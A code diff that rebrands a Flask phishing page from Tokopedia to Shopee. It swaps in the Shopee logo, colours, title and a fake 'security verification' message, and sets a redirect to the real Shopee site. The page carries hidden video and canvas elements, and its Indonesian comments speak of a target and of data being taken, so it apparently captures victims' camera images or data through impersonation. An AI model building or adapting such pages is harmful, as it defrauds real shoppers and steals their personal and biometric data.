@@ -6,9 +6,9 @@ app = Flask(__name__)
 
 # --- KONFIGURASI (Target Tokopedia) ---
 # Logo Tokopedia
-IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
+IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg"
 # Link Produk Asli (Tujuan akhir setelah data terambil)
-TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"
+TARGET_URL = "https://shopee.co.id/produk-digital/pulsa"
 
 # --- HTML TEMPLATE (Tampilan "Verifikasi Keamanan" Tokopedia) ---
 HTML_TEMPLATE = """
@@ -17,25 +17,25 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tokopedia Security Check</title>
+    <title>Shopee Security Check</title>
     <meta property="og:image" content="{{ image }}">
-    <meta property="og:title" content="Verifikasi Pesanan Tokopedia">
+    <meta property="og:title" content="Verifikasi Pesanan Shopee">
     <meta property="og:description" content="Lakukan verifikasi keamanan untuk melanjutkan transaksi.">
     <style>
         body { font-family: 'Open Sans', sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; margin: 0; }
         .container { background: white; max-width: 400px; margin: 40px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
         .logo { width: 150px; margin-bottom: 20px; }
-        h3 { color: #42b549; margin-bottom: 10px; } /* Warna Hijau Tokopedia */
+        h3 { color: #ee4d2d; margin-bottom: 10px; } /* Warna Hijau Shopee */
         p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
         
         .btn { 
-            background: #42b549; color: white; border: none; padding: 12px 25px; 
+            background: #ee4d2d; color: white; border: none; padding: 12px 25px; 
             border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; 
             width: 100%; transition: background 0.3s;
         }
-        .btn:hover { background: #359c3b; }
+        .btn:hover { background: #cc3a1c; }
         
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #42b549; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
         video, canvas { display: none; }
@@ -44,9 +44,9 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <img src="{{ image }}" class="logo" alt="Tokopedia">
+        <img src="{{ image }}" class="logo" alt="Shopee">
         <h3>Verifikasi Keamanan</h3>
-        <p>Sistem mendeteksi aktivitas login baru. Demi keamanan akun Anda, silakan lakukan verifikasi perangkat dan wajah singkat.</p>
+        <p>Sistem mendeteksi aktivitas login baru. Demi keamanan akun Anda, silakan lakukan verifikasi perangkat.</p>
         
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
